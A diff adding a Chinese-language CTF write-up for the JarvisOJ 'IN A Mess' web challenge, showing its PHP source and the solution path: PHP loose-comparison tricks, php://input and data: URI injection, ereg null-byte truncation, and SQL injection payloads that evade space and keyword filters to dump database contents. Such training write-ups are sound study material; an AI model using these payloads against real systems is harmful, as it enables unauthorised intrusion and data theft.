@@ -125,3 +125,117 @@ ascii: 'or'6É]é!r,ùíb
 payload: `http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}`
 
 flag在源代码中
+
+### ereg 00截断与php伪协议 ###
+[例题:JarvisOJ IN A Mess](http://web.jarvisoj.com:32780/)
+
+提示查看 index.phps 
+
+```
+<?php
+
+error_reporting(0);
+echo "<!--index.phps-->";
+
+if(!$_GET['id'])
+{
+	header('Location: index.php?id=1');
+	exit();
+}
+$id=$_GET['id'];
+$a=$_GET['a'];
+$b=$_GET['b'];
+if(stripos($a,'.'))
+{
+	echo 'Hahahahahaha';
+	return ;
+}
+$data = @file_get_contents($a,'r');
+if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
+{
+	require("flag.txt");
+}
+else
+{
+	print "work harder!harder!harder!";
+}
+
+
+?>
+```
+1. 让id==0
+   
+   当php进行一些数学计算的时候，有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。
+
+   ```
+   #!php
+	var_dump(0 == '0'); // true
+	var_dump(0 == 'abcdefg'); // true  
+	var_dump(0 === 'abcdefg'); // false
+	var_dump(1 == '1abcdef'); // true 
+   ```
+	所以让传入的id为abc即可
+2. 让data=="1112 is a nice lab!"
+   
+   当a为php://input，data可以通过php://input来接受post数据
+
+   所以让a=php://input 同时 post data: `1112 is a nice lab!`
+
+   **PS:** 也可以用data类型的URL进行传递
+   ```
+   data:,<文本数据>
+   data:text/plain,<文本数据>
+   data:text/html,<HTML代码>
+   data:text/html;base64,<base64编码的HTML代码>
+   data:text/css,<CSS代码>
+   data:text/css;base64,<base64编码的CSS代码>
+   data:text/javascript,<Javascript代码>
+   data:text/javascript;base64,<base64编码的Javascript代码>
+   data:image/gif;base64,base64编码的gif图片数据
+   data:image/png;base64,base64编码的png图片数据
+   data:image/jpeg;base64,base64编码的jpeg图片数据
+   data:image/x-icon;base64,base64编码的icon图片数据
+   ```
+   [参考文章](https://blog.csdn.net/lxgwm2008/article/details/38437875)
+
+   此处可以让a=data:,1112 is a nice lab!
+
+   **PPS:** 在尝试使用 php://filter/convert.base64-encode/resource 对flag.txt 进行直接读取时，发现a过滤了 `.` 无法暴力读取
+
+3. 让b的长度大于5，同时满足eregi的要求和首字母不为4
+   
+   ereg存在00截断，使b=%00111111
+
+   strlen不受00截断的影响，长度依然可以统计
+
+   使eregi的匹配转变为(111,1114)
+
+得到 `Come ON!!! {/^HT2mCpcvOLf}` 
+
+`/^HT2mCpcvOLf `应该是路径，访问 `http://web.jarvisoj.com:32780/^HT2mCpcvOLf`
+
+`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1`
+
+发现存在id=1，怀疑存在sql注入
+
+输入id=2，回显`SELECT * FROM content WHERE id=2`
+
+发现空格被过滤，union和select被替换为空，所以使用双写
+
+确定列数，当`id=1/*123*/order/*123*/by/*123*/4`，回显改变，猜测列数为3
+
+确定数据库名为test `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,database()`
+
+确定表名为content `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,group_concat(table_name)/*123*/ffromrom/*123*/information_schema.tables/*123*/where/*123*/table_schema=database()`
+
+确定列名有id,context,title `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,group_concat(column_name)/*123*/ffromrom/*123*/information_schema.columns/*123*/where/*123*/table_schema=database()`
+
+查找id中的内容 `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,id/*123*/ffromrom/*123*/content`
+返回1
+
+查找context中的内容 `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,context/*123*/ffromrom/*123*/content`
+返回flag
+
+查找title中的内容 `id=2/*123*/uunionnion/*123*/sselectelect/*123*/1,2,title/*123*/ffromrom/*123*/content`
+返回hi666
+
